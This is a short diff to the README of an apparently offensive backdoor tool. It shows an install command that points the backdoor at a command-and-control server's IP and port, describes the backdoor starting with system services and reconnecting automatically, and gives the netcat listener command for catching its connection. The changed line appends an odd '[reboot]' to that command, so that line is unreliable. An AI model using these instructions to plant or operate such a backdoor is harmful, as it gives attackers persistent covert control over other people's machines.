@@ -42,7 +42,7 @@ bash /tmp/install.sh <IP OF THE C&C server> <FREE PORT ON THE C&C SERVER>
 
 By default the backdoor will start alongside other system services. If the service can't connect to the command and control server, it will wait for a few seconds and reconnect immediately after.
 
-By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port>`).
+By "command and control server" I mean you, the one reading this right now, listening on the port you specified during install of the backdoor, using netcat (here's the command: `nc -vlp <your port> [reboot]`).
 
 ### Uninstalling (run as root)
 
